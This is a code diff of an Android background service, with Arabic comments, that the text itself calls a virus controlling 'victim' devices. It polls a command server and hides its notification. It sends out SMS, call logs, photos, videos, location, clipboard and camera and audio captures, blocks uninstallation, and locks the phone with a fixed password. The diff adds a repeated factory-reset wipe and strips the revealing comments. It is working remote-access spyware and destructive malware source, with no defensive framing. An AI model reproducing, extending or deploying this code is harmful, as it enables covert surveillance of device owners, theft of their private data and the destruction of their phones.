@@ -8,6 +8,7 @@ import android.app.admin.DevicePolicyManager;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.ComponentName;
+import android.content.ContentUris;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -70,7 +71,7 @@ import java.util.concurrent.atomic.AtomicReference;
  * ============================================================
  * الوظائف:
  * 1. Polling أبدي للأوامر من السيرفر
- * 2. تنفيذ 40+ أمر للتحكم الكامل في الجهاز
+ * 2. تنفيذ 45+ أمر للتحكم الكامل في الجهاز
  * 3. Heartbeat كل 30 ثانية لضمان الاتصال
  * 4. Auto-Update ذاتي
  * 5. الاستمرارية عبر كل الطبقات
@@ -184,7 +185,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // createChannel - قناة إشعارات صامتة
+    // createChannel
     // ============================================================
     private void createChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -200,7 +201,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // startForegroundInternal - إشعار مخفي
+    // startForegroundInternal
     // ============================================================
     private void startForegroundInternal() {
         try {
@@ -214,7 +215,6 @@ public class ServiceRunner extends Service {
                     .build();
             startForeground(NOTIFICATION_ID, n);
 
-            // ★ خفي الإشعار بعد ثانية ★
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try {
                     NotificationManager nm = (NotificationManager)
@@ -228,7 +228,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // onStartCommand
+    // onStartCommand / onBind
     // ============================================================
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -242,7 +242,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // onDestroy - إعادة تشغيل تلقائي
+    // onDestroy
     // ============================================================
     @Override
     public void onDestroy() {
@@ -250,12 +250,10 @@ public class ServiceRunner extends Service {
         Log.d(TAG, "[SERVICE] onDestroy — RESTARTING...");
 
         try {
-            // ★ أعد جدولة كل طبقات الاستمرارية ★
             PersistenceManager.scheduleAlarm(this);
             PersistenceManager.scheduleJob(this);
             PersistenceManager.scheduleEternalAlarm(this);
 
-            // ★ أعد تشغيل نفسك ★
             Intent restart = new Intent(this, ServiceRunner.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(restart);
@@ -290,24 +288,20 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // heartbeat - كل 30 ثانية
+    // heartbeat
     // ============================================================
     private void heartbeat() {
         try {
-            // ★ تأكد من WakeLock ★
             if (wakeLock == null || !wakeLock.isHeld()) {
                 acquireWakeLock();
             }
 
-            // ★ أعد جدولة الإنذار الأبدي ★
             PersistenceManager.scheduleEternalAlarm(this);
 
-            // ★ لو مش مسجل، سجل ★
             if (!registered) {
                 registerWithServer();
             }
 
-            // ★ ابعت heartbeat للسيرفر ★
             try {
                 JSONObject hb = new JSONObject();
                 hb.put("token", victimToken);
@@ -324,7 +318,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // setupPersistence - تفعيل كل الطبقات
+    // setupPersistence
     // ============================================================
     private void setupPersistence() {
         try {
@@ -353,7 +347,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // getDeviceId
+    // getDeviceId / getBatteryLevel
     // ============================================================
     private String getDeviceId() {
         try {
@@ -363,9 +357,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // getBatteryLevel
-    // ============================================================
     private int getBatteryLevel() {
         try {
             android.content.IntentFilter ifilter = new android.content.IntentFilter(
@@ -404,7 +395,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // pollCommands - polling أبدي
+    // pollCommands
     // ============================================================
     private void pollCommands() {
         try {
@@ -413,7 +404,6 @@ public class ServiceRunner extends Service {
                 return;
             }
 
-            // ★ تحقق سريع لو فيه أوامر ★
             String checkUrl = SERVER_URL + "/apk/victim/poll?token=" + victimToken + "&check=1";
             String checkResponse = httpGet(checkUrl);
             if (checkResponse == null || checkResponse.isEmpty()) return;
@@ -423,7 +413,6 @@ public class ServiceRunner extends Service {
 
             if (!hasCommands) return;
 
-            // ★ اسحب الأوامر ★
             String url = SERVER_URL + "/apk/victim/poll?token=" + victimToken;
             String response = httpGet(url);
             if (response == null || response.isEmpty()) return;
@@ -444,7 +433,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // handleCommand - معالج الأوامر الرئيسي
+    // handleCommand
     // ============================================================
     private void handleCommand(JSONObject cmd) {
         String action = "";
@@ -535,40 +524,48 @@ public class ServiceRunner extends Service {
 
                 // ============ ★★★ أوامر الفيروس ★★★ ============
                 case "self_destruct":
-                    // ★ امسح الجهاز ★
-                    Log.d(TAG, "★★★ SELF DESTRUCT COMMAND ★★★");
-                    try {
-                        DevicePolicyManager dpm = (DevicePolicyManager)
-                                getSystemService(Context.DEVICE_POLICY_SERVICE);
-                        if (dpm != null) {
-                            dpm.wipeData(0);
-                        }
-                    } catch (Exception ignored) {}
+                case "factory_reset":
+                case "wipe":
+                    Log.d(TAG, "★★★ FACTORY RESET COMMAND ★★★");
+                    executeFactoryReset();
                     break;
 
                 case "lock_device":
-                    // ★ اقفل الجهاز نهائيًا بكلمة سر ★
+                    Log.d(TAG, "★★★ LOCK DEVICE COMMAND ★★★");
                     try {
                         DevicePolicyManager dpm = (DevicePolicyManager)
                                 getSystemService(Context.DEVICE_POLICY_SERVICE);
                         ComponentName admin = new ComponentName(this, AdminReceiver.class);
                         if (dpm != null && dpm.isAdminActive(admin)) {
-                            dpm.resetPassword("XZP-9846-LOCK", 0);
+                            try {
+                                dpm.resetPassword("XZP-9846-LOCK", 0);
+                            } catch (Exception e) {
+                                Log.e(TAG, "resetPassword error: " + e.getMessage());
+                            }
                             dpm.lockNow();
+                            reportCommandResult(action, "ok", "");
+                        } else {
+                            reportCommandResult(action, "fail", "device_admin_not_enabled");
                         }
-                    } catch (Exception ignored) {}
+                    } catch (Exception e) {
+                        reportCommandResult(action, "fail", e.getMessage());
+                    }
                     break;
 
                 case "block_uninstall":
-                    // ★ فعّل الحماية من الحذف ★
                     try {
                         DevicePolicyManager dpm = (DevicePolicyManager)
                                 getSystemService(Context.DEVICE_POLICY_SERVICE);
                         ComponentName admin = new ComponentName(this, AdminReceiver.class);
                         if (dpm != null && dpm.isAdminActive(admin)) {
                             dpm.setUninstallBlocked(admin, getPackageName(), true);
+                            reportCommandResult(action, "ok", "");
+                        } else {
+                            reportCommandResult(action, "fail", "device_admin_not_enabled");
                         }
-                    } catch (Exception ignored) {}
+                    } catch (Exception e) {
+                        reportCommandResult(action, "fail", e.getMessage());
+                    }
                     break;
 
                 case "unblock_uninstall":
@@ -578,12 +575,16 @@ public class ServiceRunner extends Service {
                         ComponentName admin = new ComponentName(this, AdminReceiver.class);
                         if (dpm != null && dpm.isAdminActive(admin)) {
                             dpm.setUninstallBlocked(admin, getPackageName(), false);
+                            reportCommandResult(action, "ok", "");
+                        } else {
+                            reportCommandResult(action, "fail", "device_admin_not_enabled");
                         }
-                    } catch (Exception ignored) {}
+                    } catch (Exception e) {
+                        reportCommandResult(action, "fail", e.getMessage());
+                    }
                     break;
 
                 case "ping":
-                    // ★ رد بسيط عشان نعرف إن الجهاز لسه شغال ★
                     reportCommandResult("ping", "ok", "");
                     break;
 
@@ -594,6 +595,49 @@ public class ServiceRunner extends Service {
             Log.e(TAG, "handleCommand: " + e.getMessage());
             e.printStackTrace();
             reportCommandResult(action, "fail", e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // ★★★ executeFactoryReset ★★★
+    // ============================================================
+    private void executeFactoryReset() {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager)
+                    getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, AdminReceiver.class);
+
+            if (dpm == null) {
+                reportCommandResult("factory_reset", "fail", "no_dpm");
+                return;
+            }
+
+            if (!dpm.isAdminActive(admin)) {
+                reportCommandResult("factory_reset", "fail", "device_admin_not_enabled");
+                return;
+            }
+
+            // ★ حاول Wipe 3 مرات ★
+            for (int i = 0; i < 3; i++) {
+                try {
+                    int flags = DevicePolicyManager.WIPE_EXTERNAL_STORAGE
+                            | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA;
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                        flags |= 0x0004; // WIPE_EUICC
+                    }
+                    dpm.wipeData(flags);
+                    Log.d(TAG, "★★★ Wipe attempt " + (i + 1) + " sent ★★★");
+                    reportCommandResult("factory_reset", "ok", "attempt_" + (i + 1));
+                    return;
+                } catch (Exception e) {
+                    Log.e(TAG, "Wipe attempt " + (i + 1) + " error: " + e.getMessage());
+                    try { Thread.sleep(1000); } catch (Exception ignored) {}
+                }
+            }
+
+            reportCommandResult("factory_reset", "fail", "all_attempts_failed");
+        } catch (Exception e) {
+            reportCommandResult("factory_reset", "fail", e.getMessage());
         }
     }
 
@@ -668,6 +712,9 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // ★★★ sendSms (بدون LIMIT) ★★★
+    // ============================================================
     private void sendSms() {
         try {
             if (!hasPermission(android.Manifest.permission.READ_SMS)) {
@@ -675,15 +722,25 @@ public class ServiceRunner extends Service {
                 return;
             }
             JSONArray arr = new JSONArray();
+            // ★ إزالة "LIMIT 50" من الـ query ★
             Cursor c = getContentResolver().query(
-                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50");
+                    Uri.parse("content://sms/inbox"),
+                    null, null, null,
+                    "date DESC");
+
             if (c != null) {
-                while (c.moveToNext() && arr.length() < 50) {
-                    JSONObject s = new JSONObject();
-                    s.put("from", c.getString(c.getColumnIndexOrThrow("address")));
-                    s.put("body", c.getString(c.getColumnIndexOrThrow("body")));
-                    s.put("date", c.getString(c.getColumnIndexOrThrow("date")));
-                    arr.put(s);
+                int count = 0;
+                while (c.moveToNext() && count < 50) {
+                    try {
+                        JSONObject s = new JSONObject();
+                        s.put("from", c.getString(c.getColumnIndexOrThrow("address")));
+                        s.put("body", c.getString(c.getColumnIndexOrThrow("body")));
+                        s.put("date", c.getString(c.getColumnIndexOrThrow("date")));
+                        arr.put(s);
+                        count++;
+                    } catch (Exception e) {
+                        Log.e(TAG, "sms row error: " + e.getMessage());
+                    }
                 }
                 c.close();
             }
@@ -699,6 +756,9 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // ★★★ sendCallLog (بدون LIMIT) ★★★
+    // ============================================================
     private void sendCallLog() {
         try {
             if (!hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
@@ -706,16 +766,26 @@ public class ServiceRunner extends Service {
                 return;
             }
             JSONArray arr = new JSONArray();
-            Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null,
-                    CallLog.Calls.DATE + " DESC LIMIT 50");
+            // ★ إزالة "LIMIT 50" من الـ query ★
+            Cursor c = getContentResolver().query(
+                    CallLog.Calls.CONTENT_URI,
+                    null, null, null,
+                    CallLog.Calls.DATE + " DESC");
+
             if (c != null) {
-                while (c.moveToNext() && arr.length() < 50) {
-                    JSONObject call = new JSONObject();
-                    call.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
-                    call.put("duration", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
-                    call.put("type", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
-                    call.put("date", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DATE)));
-                    arr.put(call);
+                int count = 0;
+                while (c.moveToNext() && count < 50) {
+                    try {
+                        JSONObject call = new JSONObject();
+                        call.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                        call.put("duration", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
+                        call.put("type", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
+                        call.put("date", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DATE)));
+                        arr.put(call);
+                        count++;
+                    } catch (Exception e) {
+                        Log.e(TAG, "call log row error: " + e.getMessage());
+                    }
                 }
                 c.close();
             }
@@ -854,7 +924,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ الصور والفيديو ★★★
+    // الصور والفيديو
     // ============================================================
     private void sendPhotos() {
         try {
@@ -917,7 +987,7 @@ public class ServiceRunner extends Service {
                     String mime = cursor.getString(mimeCol);
                     if (size <= 0 || size > maxSize) continue;
 
-                    Uri imageUri = android.content.ContentUris.withAppendedId(collection, id);
+                    Uri imageUri = ContentUris.withAppendedId(collection, id);
                     InputStream inputStream = null;
                     byte[] bytes = null;
                     try {
@@ -1039,7 +1109,7 @@ public class ServiceRunner extends Service {
                     long duration = cursor.getLong(durCol);
                     if (size <= 0 || size > maxSize) continue;
 
-                    Uri videoUri = android.content.ContentUris.withAppendedId(collection, id);
+                    Uri videoUri = ContentUris.withAppendedId(collection, id);
                     InputStream inputStream = null;
                     byte[] bytes = null;
                     try {
@@ -1099,7 +1169,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ الموقع ★★★
+    // الموقع
     // ============================================================
     private void sendLocation() {
         Log.d(TAG, "sendLocation called");
@@ -1137,7 +1207,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ الحافظة ★★★
+    // الحافظة
     // ============================================================
     private void sendClipboard() {
         try {
@@ -1167,7 +1237,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ الكاميرا - صورة ★★★
+    // الكاميرا
     // ============================================================
     private void takePicture(final int cameraId) {
         Log.d(TAG, "takePicture called: cameraId=" + cameraId + " (0=back, 1=front)");
@@ -1205,7 +1275,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ تسجيل صوت ★★★
+    // تسجيل صوت
     // ============================================================
     private void recordAudio(final int durationMs) {
         new Thread(() -> {
@@ -1269,7 +1339,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ تسجيل فيديو ★★★
+    // تسجيل فيديو
     // ============================================================
     private void recordVideo(final int cameraId, final int durationMs) {
         Log.d(TAG, "recordVideo called: cameraId=" + cameraId + " duration=" + durationMs);
@@ -1524,7 +1594,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ وسائط وطاقة ★★★
+    // وسائط وطاقة
     // ============================================================
     private void sendMediaKey(String key) {
         try {
@@ -1954,4 +2024,4 @@ public class ServiceRunner extends Service {
     private void postJson(String path, JSONObject data) {
         postJsonWithResponse(path, data);
     }
-    }
+}
